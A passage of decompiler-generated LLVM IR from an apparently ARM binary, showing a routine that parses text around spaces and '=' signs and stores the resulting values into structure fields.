dec_label_pc_9144:                                ; preds = %.thread23
  %v0_9144 = load i32, i32* @r5, align 4
  store i32 %v0_9144, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_914c = inttoptr i32 %v0_9144 to i32*
  %v3_914c = call i32 @function_119d0(i32 44, i32* %v2_914c)
  %v0_9150 = load i32, i32* @fp, align 4
  store i32 %v0_9150, i32* @r1, align 4
  store i32 %v3_914c, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_915c = call i32 @function_12680(i8* %v3_829c, i32 %v0_9150, i32 %v3_914c)
  store i32 %v4_915c, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9164 = add i32 %v4_915c, %v2_8278
  %v3_9164 = inttoptr i32 %v2_9164 to i8*
  %v4_9164 = load i8, i8* %v3_9164, align 1
  %v2_916c = icmp ugt i8 %v4_9164, 31
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i8 %v4_9164, 32
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  %v2_9174 = zext i1 %v7_916c to i32
  %v2_9174.v4_915c = add i32 %v2_9174, %v4_915c
  store i32 %v2_9174.v4_915c, i32* @r4, align 4
  %v2_9178 = add i32 %v2_9174.v4_915c, %v2_8278
  store i32 %v2_9178, i32* @r6, align 4
  store i32 %v2_9178, i32* %r0.global-to-local, align 4
  %v1_9180 = load i32, i32* @fp, align 4
  %v2_9180 = sub i32 %v1_9180, %v2_9174.v4_915c
  store i32 %v2_9180, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_918c = call i32 @function_123dc(i32 %v2_9178, i32 %v2_9180, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_918c, i32* %r0.global-to-local, align 4
  %v2_9190 = icmp eq i32 %v5_918c, -1
  store i1 %v2_9190, i1* %cpsr_c.global-to-local, align 1
  %v7_9190 = icmp eq i32 %v5_918c, -1
  store i1 %v7_9190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9190, label %.thread24, label %dec_label_pc_9198

dec_label_pc_9198:                                ; preds = %dec_label_pc_9144
  %v2_9198 = icmp ne i32 %v5_918c, 0
  store i1 %v2_9198, i1* %cpsr_c.global-to-local, align 1
  %v7_9198 = icmp eq i32 %v5_918c, 1
  store i1 %v7_9198, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  %v7_91a0 = icmp slt i32 %v5_918c, 2
  br i1 %v7_91a0, label %bb173, label %bb172

bb172:                                            ; preds = %dec_label_pc_9198
  %v9_91a0 = add i32 %v5_918c, -2
  store i32 %v9_91a0, i32* %r0.global-to-local, align 4
  br label %bb173

bb173:                                            ; preds = %dec_label_pc_9198, %bb172
  %v1_91a8 = phi i32 [ %v5_918c, %dec_label_pc_9198 ], [ %v9_91a0, %bb172 ]
  store i32 %v2_86d8, i32* %r2.global-to-local, align 4
  %v2_91a8 = add i32 %v1_91a8, %v2_86d8
  %v1_91ac = load i32, i32* @r4, align 4
  %v2_91ac = add i32 %v2_91a8, %v1_91ac
  store i32 %v2_91ac, i32* %r3.global-to-local, align 4
  %v0_91b0 = load i32, i32* @r5, align 4
  %v1_91b0 = trunc i32 %v0_91b0 to i8
  %v3_91b0 = load i32, i32* @r7, align 4
  %v4_91b0 = add i32 %v3_91b0, %v2_91ac
  %v5_91b0 = inttoptr i32 %v4_91b0 to i8*
  store i8 %v1_91b0, i8* %v5_91b0, align 1
  %v0_91b4 = load i32, i32* @r6, align 4
  store i32 %v0_91b4, i32* %r0.global-to-local, align 4
  %v1_91b8 = inttoptr i32 %v0_91b4 to i8*
  %v2_91b8 = call i32 @function_12324(i8* %v1_91b8)
  %v0_91bc = load i32, i32* @r5, align 4
  store i32 %v0_91bc, i32* %r1.global-to-local, align 4
  store i32 %v2_91b8, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_91c8 = inttoptr i32 %v0_91bc to i32*
  %v3_91c8 = call i32 @function_119d0(i32 43, i32* %v2_91c8)
  %v0_91cc = load i32, i32* @r4, align 4
  store i32 %v0_91cc, i32* @r1, align 4
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  store i32 %v0_91d4, i32* %r0.global-to-local, align 4
  %v3_91d8 = inttoptr i32 %v0_91d4 to i8*
  %v4_91d8 = call i32 @function_12680(i8* %v3_91d8, i32 %v0_91cc, i32 %v3_91c8)
  store i32 %v4_91d8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91dc = icmp eq i32 %v4_91d8, 0
  store i1 %v2_91dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91dc, label %.thread24, label %bb174

bb174:                                            ; preds = %bb173
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91e4 = load i32, i32* @sl, align 4
  %v3_91e4 = add i32 %v2_91e4, 4
  %v4_91e4 = inttoptr i32 %v3_91e4 to i32*
  store i32 1, i32* %v4_91e4, align 4
  br label %.thread24

.thread24:                                        ; preds = %bb173, %dec_label_pc_9144, %.thread23, %bb174
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_91f4 = load i32, i32* @sl, align 4
  %v2_91f4 = add i32 %v1_91f4, 8
  %v3_91f4 = inttoptr i32 %v2_91f4 to i32*
  store i32 0, i32* %v3_91f4, align 4
  %v3_91f8 = call i32 @function_119d0(i32 41, i32* null)
  %v0_91fc = load i32, i32* @fp, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @function_12680(i8* %v3_829c, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  %v2_9210 = icmp eq i32 %v4_9208, -1
  store i1 %v2_9210, i1* %cpsr_c.global-to-local, align 1
  %v7_9210 = icmp eq i32 %v4_9208, -1
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9210, label %.thread25, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %.thread24
  %v0_921c = load i32, i32* @r7, align 4
  store i32 %v0_921c, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9224 = inttoptr i32 %v0_921c to i32*
  %v3_9224 = call i32 @function_119d0(i32 41, i32* %v2_9224)
  %v0_9228 = load i32, i32* @fp, align 4
  store i32 %v0_9228, i32* @r1, align 4
  store i32 %v3_9224, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9234 = call i32 @function_12680(i8* %v3_829c, i32 %v0_9228, i32 %v3_9224)
  store i32 %v4_9234, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v2_923c = add i32 %v4_9234, %v2_8278
  %v3_923c = inttoptr i32 %v2_923c to i8*
  %v4_923c = load i8, i8* %v3_923c, align 1
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9244 = icmp ugt i8 %v4_923c, 31
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i8 %v4_923c, 32
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  %v2_924c = zext i1 %v7_9244 to i32
  %v2_924c.v4_9234 = add i32 %v2_924c, %v4_9234
  store i32 %v2_924c.v4_9234, i32* @r4, align 4
  %v2_9250 = add i32 %v2_924c.v4_9234, %v2_8278
  store i32 %v2_9250, i32* @r5, align 4
  store i32 %v2_9250, i32* %r0.global-to-local, align 4
  %v1_9258 = load i32, i32* @fp, align 4
  %v2_9258 = sub i32 %v1_9258, %v2_924c.v4_9234
  store i32 %v2_9258, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9264 = call i32 @function_123dc(i32 %v2_9250, i32 %v2_9258, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_9264, i32* %r0.global-to-local, align 4
  %v2_9268 = icmp eq i32 %v5_9264, -1
  store i1 %v2_9268, i1* %cpsr_c.global-to-local, align 1
  %v7_9268 = icmp eq i32 %v5_9264, -1
  store i1 %v7_9268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9268, label %.thread25, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_921c
  %v2_9270 = icmp ne i32 %v5_9264, 0
  store i1 %v2_9270, i1* %cpsr_c.global-to-local, align 1
  %v7_9270 = icmp eq i32 %v5_9264, 1
  store i1 %v7_9270, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r1.global-to-local, align 4
  %v7_9278 = icmp slt i32 %v5_9264, 2
  br i1 %v7_9278, label %bb176, label %bb175

bb175:                                            ; preds = %dec_label_pc_9270
  %v9_9278 = add i32 %v5_9264, -2
  store i32 %v9_9278, i32* %r0.global-to-local, align 4
  br label %bb176

bb176:                                            ; preds = %dec_label_pc_9270, %bb175
  %v1_9280 = phi i32 [ %v5_9264, %dec_label_pc_9270 ], [ %v9_9278, %bb175 ]
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v2_9280 = add i32 %v1_9280, %v2_86d8
  %v1_9284 = load i32, i32* @r4, align 4
  %v2_9284 = add i32 %v2_9280, %v1_9284
  store i32 %v2_9284, i32* %r3.global-to-local, align 4
  %v0_9288 = load i32, i32* @r7, align 4
  %v1_9288 = trunc i32 %v0_9288 to i8
  %v3_9288 = load i32, i32* @r6, align 4
  %v4_9288 = add i32 %v3_9288, %v2_9284
  %v5_9288 = inttoptr i32 %v4_9288 to i8*
  store i8 %v1_9288, i8* %v5_9288, align 1
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v1_9290 = inttoptr i32 %v0_928c to i8*
  %v2_9290 = call i32 @function_12324(i8* %v1_9290)
  %v0_9294 = load i32, i32* @r7, align 4
  store i32 %v0_9294, i32* %r1.global-to-local, align 4
  store i32 %v2_9290, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_92a0 = inttoptr i32 %v0_9294 to i32*
  %v3_92a0 = call i32 @function_119d0(i32 42, i32* %v2_92a0)
  %v0_92a4 = load i32, i32* @r4, align 4
  store i32 %v0_92a4, i32* @r1, align 4
  store i32 %v3_92a0, i32* %r2.global-to-local, align 4
  %v0_92ac = load i32, i32* @r5, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v3_92b0 = inttoptr i32 %v0_92ac to i8*
  %v4_92b0 = call i32 @function_12680(i8* %v3_92b0, i32 %v0_92a4, i32 %v3_92a0)
  store i32 %v4_92b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_92b4 = icmp eq i32 %v4_92b0, 0
  store i1 %v2_92b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_92b4, label %.thread25, label %bb177

bb177:                                            ; preds = %bb176
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_92bc = load i32, i32* @sl, align 4
  %v3_92bc = add i32 %v2_92bc, 8
  %v4_92bc = inttoptr i32 %v3_92bc to i32*
  store i32 1, i32* %v4_92bc, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb176, %dec_label_pc_921c, %.thread24, %bb177
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_92c8 = call i32 @function_119d0(i32 40, i32* null)
  %v0_92cc = load i32, i32* @fp, align 4
  store i32 %v0_92cc, i32* @r1, align 4
  store i32 %v3_92c8, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_92d8 = call i32 @function_12680(i8* %v3_829c, i32 %v0_92cc, i32 %v3_92c8)
  store i32 %v4_92d8, i32* %r0.global-to-local, align 4
  %v2_92dc = icmp eq i32 %v4_92d8, -1
  store i1 %v2_92dc, i1* %cpsr_c.global-to-local, align 1
  %v7_92dc = icmp eq i32 %v4_92d8, -1
  store i1 %v7_92dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92dc, label %.thread, label %dec_label_pc_92f4

.thread:                                          ; preds = %.thread25
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92ec = load i32, i32* @sl, align 4
  %v3_92ec = add i32 %v2_92ec, 12
  %v4_92ec = inttoptr i32 %v3_92ec to i32*
  store i32 0, i32* %v4_92ec, align 4
  br label %dec_label_pc_9378

dec_label_pc_92f4:                                ; preds = %.thread25
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_92fc = call i32 @function_119d0(i32 40, i32* null)
  %v0_9300 = load i32, i32* @fp, align 4
  store i32 %v0_9300, i32* @r1, align 4
  store i32 %v3_92fc, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_930c = call i32 @function_12680(i8* %v3_829c, i32 %v0_9300, i32 %v3_92fc)
  store i32 %v4_930c, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %r2.global-to-local, align 4
  %v2_9314 = add i32 %v4_930c, %v2_8278
  %v3_9314 = inttoptr i32 %v2_9314 to i8*
  %v4_9314 = load i8, i8* %v3_9314, align 1
  %v2_9318 = icmp ugt i8 %v4_9314, 31
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v4_9314, 32
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  %v2_9324 = zext i1 %v7_9318 to i32
  %v2_9324.v4_930c = add i32 %v2_9324, %v4_930c
  store i32 %v2_9324.v4_930c, i32* @r4, align 4
  %v2_9328 = add i32 %v2_9324.v4_930c, %v2_8278
  store i32 %v2_9328, i32* @r5, align 4
  store i32 %v2_9328, i32* %r0.global-to-local, align 4
  %v1_9330 = load i32, i32* @fp, align 4
  %v2_9330 = sub i32 %v1_9330, %v2_9324.v4_930c
  store i32 %v2_9330, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_933c = call i32 @function_123dc(i32 %v2_9328, i32 %v2_9330, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_933c, i32* %r0.global-to-local, align 4
  %v2_9340 = icmp eq i32 %v5_933c, -1
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  %v7_9340 = icmp eq i32 %v5_933c, -1
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %dec_label_pc_9378, label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_92f4
  %v2_9348 = icmp ne i32 %v5_933c, 0
  store i1 %v2_9348, i1* %cpsr_c.global-to-local, align 1
  %v7_9348 = icmp eq i32 %v5_933c, 1
  store i1 %v7_9348, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %ip.global-to-local, align 4
  %v7_9350 = icmp slt i32 %v5_933c, 2
  br i1 %v7_9350, label %bb179, label %bb178

bb178:                                            ; preds = %dec_label_pc_9348
  %v9_9350 = add i32 %v5_933c, -2
  store i32 %v9_9350, i32* %r0.global-to-local, align 4
  br label %bb179

bb179:                                            ; preds = %dec_label_pc_9348, %bb178
  %v1_9358 = phi i32 [ %v5_933c, %dec_label_pc_9348 ], [ %v9_9350, %bb178 ]
  store i32 %v2_86d8, i32* %ip.global-to-local, align 4
  %v2_9358 = add i32 %v1_9358, %v2_86d8
  %v1_935c = load i32, i32* @r4, align 4
  %v2_935c = add i32 %v2_9358, %v1_935c
  store i32 %v2_935c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9364 = load i32, i32* @r5, align 4
  store i32 %v0_9364, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_936c = load i32, i32* @r6, align 4
  %v4_936c = add i32 %v3_936c, %v2_935c
  %v5_936c = inttoptr i32 %v4_936c to i8*
  store i8 0, i8* %v5_936c, align 1
  %v2_9370 = inttoptr i32 %v0_9364 to i8*
  %v3_9370 = call i32 @function_12448(i8* %v2_9370, i32 10)
  store i32 %v3_9370, i32* %r0.global-to-local, align 4
  %v1_9374 = load i32, i32* @sl, align 4
  %v2_9374 = add i32 %v1_9374, 12
  %v3_9374 = inttoptr i32 %v2_9374 to i32*
  store i32 %v3_9370, i32* %v3_9374, align 4
  br label %dec_label_pc_9378

dec_label_pc_9378:                                ; preds = %.thread, %dec_label_pc_92f4, %bb179
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_937c:                                ; preds = %dec_label_pc_9548, %dec_label_pc_94c8, %dec_label_pc_9378
  %v1_9388 = phi i32 [ 0, %dec_label_pc_9378 ], [ %v0_94c8, %dec_label_pc_94c8 ], [ %v1_9388.pre.pre, %dec_label_pc_9548 ]
  store i32 %v2_8278, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9388 = add i32 %v1_9388, %v2_8278
  store i32 %v2_9388, i32* @r4, align 4
  %v3_938c = call i32 @function_119d0(i32 39, i32* null)
  %v0_9390 = load i32, i32* @fp, align 4
  store i32 %v0_9390, i32* @r1, align 4
  store i32 %v3_938c, i32* %r2.global-to-local, align 4
  %v0_9398 = load i32, i32* @r4, align 4
  store i32 %v0_9398, i32* %r0.global-to-local, align 4
  %v3_939c = inttoptr i32 %v0_9398 to i8*
  %v4_939c = call i32 @function_12680(i8* %v3_939c, i32 %v0_9390, i32 %v3_938c)
  store i32 %v4_939c, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_93a8 = icmp eq i32 %v4_939c, -1
  store i1 %v2_93a8, i1* %cpsr_c.global-to-local, align 1
  %v7_93a8 = icmp eq i32 %v4_939c, -1
  store i1 %v7_93a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93a8, label %dec_label_pc_95d8, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_937c
  %v0_93b4 = load i32, i32* @sl, align 4
  %v1_93b4 = add i32 %v0_93b4, 16
  %v2_93b4 = inttoptr i32 %v1_93b4 to i32*
  %v3_93b4 = load i32, i32* %v2_93b4, align 4
  store i32 %v3_93b4, i32* %r3.global-to-local, align 4
  %v2_93b8 = icmp ugt i32 %v3_93b4, 3
  store i1 %v2_93b8, i1* %cpsr_c.global-to-local, align 1
  %v7_93b8 = icmp eq i32 %v3_93b4, 4
  store i1 %v7_93b8, i1* %cpsr_z.global-to-local, align 1
  %v8_93bc = icmp sgt i32 %v3_93b4, 4
  br i1 %v8_93bc, label %dec_label_pc_95d8, label %dec_label_pc_93c0

dec_label_pc_93c0:                                ; preds = %dec_label_pc_93b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_93c8 = call i32 @function_119d0(i32 39, i32* null)
  %v0_93cc = load i32, i32* @fp, align 4
  store i32 %v0_93cc, i32* @r1, align 4
  store i32 %v3_93c8, i32* %r2.global-to-local, align 4
  %v0_93d4 = load i32, i32* @r4, align 4
  store i32 %v0_93d4, i32* %r0.global-to-local, align 4
  %v3_93d8 = inttoptr i32 %v0_93d4 to i8*
  %v4_93d8 = call i32 @function_12680(i8* %v3_93d8, i32 %v0_93cc, i32 %v3_93c8)
  store i32 %v4_93d8, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v1_93e0 = load i32, i32* @r5, align 4
  %v2_93e0 = add i32 %v1_93e0, %v4_93d8
  store i32 %v2_93e0, i32* @r8, align 4
  %v2_93e4 = add i32 %v2_93e0, %v2_8278
  %v3_93e4 = inttoptr i32 %v2_93e4 to i8*
  %v4_93e4 = load i8, i8* %v3_93e4, align 1
  %v6_93e4 = zext i8 %v4_93e4 to i32
  store i32 %v6_93e4, i32* %r3.global-to-local, align 4
  %v2_93e8 = icmp ugt i8 %v4_93e4, 31
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i8 %v4_93e4, 32
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93e8, label %bb180, label %bb181

bb180:                                            ; preds = %dec_label_pc_93c0
  %v2_93ec = add i32 %v4_93d8, 1
  store i32 %v2_93ec, i32* %r0.global-to-local, align 4
  br label %bb181

bb181:                                            ; preds = %dec_label_pc_93c0, %bb180
  %v1_93fc = phi i32 [ %v4_93d8, %dec_label_pc_93c0 ], [ %v2_93ec, %bb180 ]
  %v1_93f0 = load i32, i32* @fp, align 4
  %v2_93f0 = sub i32 %v1_93f0, %v1_93e0
  store i32 %v2_93f0, i32* %r3.global-to-local, align 4
  %v2_93f4 = sub i32 %v2_93f0, %v1_93fc
  store i32 %v2_93f4, i32* @r7, align 4
  %v0_93f8 = load i32, i32* @r4, align 4
  %v2_93f8 = add i32 %v0_93f8, %v1_93fc
  store i32 %v2_93f8, i32* @r6, align 4
  br i1 %v7_93e8, label %bb182, label %bb183

bb182:                                            ; preds = %bb181
  %v3_93fc = add i32 %v1_93fc, %v1_93e0
  store i32 %v3_93fc, i32* @r8, align 4
  br label %bb183

bb183:                                            ; preds = %bb181, %bb182
  store i32 %v2_93f4, i32* %r1.global-to-local, align 4
  store i32 %v2_93f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9410 = call i32 @function_123dc(i32 %v2_93f8, i32 %v2_93f4, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_9410, i32* %r0.global-to-local, align 4
  %v2_9414 = icmp eq i32 %v5_9410, -1
  store i1 %v2_9414, i1* %cpsr_c.global-to-local, align 1
  %v7_9414 = icmp eq i32 %v5_9410, -1
  store i1 %v7_9414, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9410, i32* @r4, align 4
  br i1 %v7_9414, label %dec_label_pc_94c8, label %dec_label_pc_9420

dec_label_pc_9420:                                ; preds = %bb183
  store i32 %v2_8278, i32* %r1.global-to-local, align 4
  %v2_9424 = icmp ne i32 %v5_9410, 0
  store i1 %v2_9424, i1* %cpsr_c.global-to-local, align 1
  %v7_9424 = icmp eq i32 %v5_9410, 1
  store i1 %v7_9424, i1* %cpsr_z.global-to-local, align 1
  %v7_9428 = icmp slt i32 %v5_9410, 2
  br i1 %v7_9428, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_9420
  %v9_9428 = add i32 %v5_9410, -2
  store i32 %v9_9428, i32* @r4, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_9420, %bb184
  %v1_942c = load i32, i32* @r8, align 4
  %v2_942c = add i32 %v1_942c, %v2_8278
  store i32 %v2_942c, i32* @r5, align 4
  %v0_9430 = load i32, i32* @r6, align 4
  store i32 %v0_9430, i32* %r0.global-to-local, align 4
  %v0_9434 = load i32, i32* @r7, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9440 = call i32 @function_123dc(i32 %v0_9430, i32 %v0_9434, i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32 1)
  store i32 %v4_9440, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9444 = icmp eq i32 %v4_9440, 0
  store i1 %v2_9444, i1* %cpsr_z.global-to-local, align 1
  %tmp186 = icmp slt i32 %v4_9440, 1
  br i1 %tmp186, label %.dec_label_pc_9464_crit_edge, label %dec_label_pc_944c

.dec_label_pc_9464_crit_edge:                     ; preds = %bb185
  %v1_9478.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9464

dec_label_pc_944c:                                ; preds = %bb185
  %v0_944c = load i32, i32* @r6, align 4
  store i32 %v0_944c, i32* %r0.global-to-local, align 4
  %v0_9450 = load i32, i32* @r7, align 4
  store i32 %v0_9450, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_945c = call i32 @function_123dc(i32 %v0_944c, i32 %v0_9450, i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32 1)
  store i32 %v4_945c, i32* %r0.global-to-local, align 4
  %v1_9460 = add i32 %v4_945c, -1
  store i32 %v1_9460, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9464

dec_label_pc_9464:                                ; preds = %.dec_label_pc_9464_crit_edge, %dec_label_pc_944c
  %v1_9478 = phi i32 [ %v1_9478.pre, %.dec_label_pc_9464_crit_edge ], [ %v1_9460, %dec_label_pc_944c ]
  store i32 %v2_86d8, i32* %ip.global-to-local, align 4
  %v1_946c = load i32, i32* @r8, align 4
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_946c = add i32 %v1_9478, %v2_86d8
  %v2_9478 = add i32 %v2_946c, %v1_946c
  store i32 %v2_9478, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9480 = add i32 %v2_9478, -20773
  %v5_9480 = inttoptr i32 %v4_9480 to i8*
  store i8 0, i8* %v5_9480, align 1
  %storemerge5.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_94a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_94a0

dec_label_pc_948c:                                ; preds = %dec_label_pc_94a0
  br i1 %v7_9490, label %dec_label_pc_94d0, label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_948c
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_94a0

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9464, %dec_label_pc_9498
  %v0_94a0 = phi i32 [ %v0_948c, %dec_label_pc_9498 ], [ %v0_94a0.pre, %dec_label_pc_9464 ]
  %storemerge5 = phi i32 [ %v1_94b4, %dec_label_pc_9498 ], [ %storemerge5.pre, %dec_label_pc_9464 ]
  store i32 %storemerge5, i32* %stack_var_-44, align 4
  store i32 %v0_94a0, i32* %r0.global-to-local, align 4
  %v1_94a4 = inttoptr i32 %v0_94a0 to i8*
  %v2_94a4 = call i32 @function_12324(i8* %v1_94a4)
  store i32 %v2_94a4, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_94ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94ac, i32* %r4.global-to-local, align 4
  %v3_94b0 = icmp uge i32 %v2_94a4, %v3_94ac
  store i1 %v3_94b0, i1* %cpsr_c.global-to-local, align 1
  %v9_94b0 = icmp eq i32 %v2_94a4, %v3_94ac
  store i1 %v9_94b0, i1* %cpsr_z.global-to-local, align 1
  %v1_94b4 = add i32 %v3_94ac, 1
  store i32 %v1_94b4, i32* %ip.global-to-local, align 4
  %v8_94b8 = icmp sgt i32 %v2_94a4, %v3_94ac
  %v0_948c = load i32, i32* @r5, align 4
  %v2_948c = add i32 %v0_948c, %v3_94ac
  %v3_948c = inttoptr i32 %v2_948c to i8*
  %v4_948c = load i8, i8* %v3_948c, align 1
  %v6_948c = zext i8 %v4_948c to i32
  store i32 %v6_948c, i32* %r3.global-to-local, align 4
  %v2_9490 = icmp ugt i8 %v4_948c, 60
  store i1 %v2_9490, i1* %cpsr_c.global-to-local, align 1
  %v7_9490 = icmp eq i8 %v4_948c, 61
  store i1 %v7_9490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_94b8, label %dec_label_pc_948c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a0
  br i1 %v7_9490, label %dec_label_pc_94d0, label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_9514, %dec_label_pc_9538, %dec_label_pc_94bc, %bb183
  %v0_94c8 = load i32, i32* @r8, align 4
  store i32 %v0_94c8, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_94d0:                                ; preds = %dec_label_pc_948c, %dec_label_pc_94bc
  %v0_94d0 = load i32, i32* @sl, align 4
  %v1_94d0 = add i32 %v0_94d0, 16
  %v2_94d0 = inttoptr i32 %v1_94d0 to i32*
  %v3_94d0 = load i32, i32* %v2_94d0, align 4
  store i32 %v3_94d0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94dc = icmp eq i32 %v3_94d0, 0
  store i1 %v2_94dc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp187 = icmp slt i32 %v3_94d0, 1
  br i1 %tmp187, label %dec_label_pc_9538, label %dec_label_pc_94e8

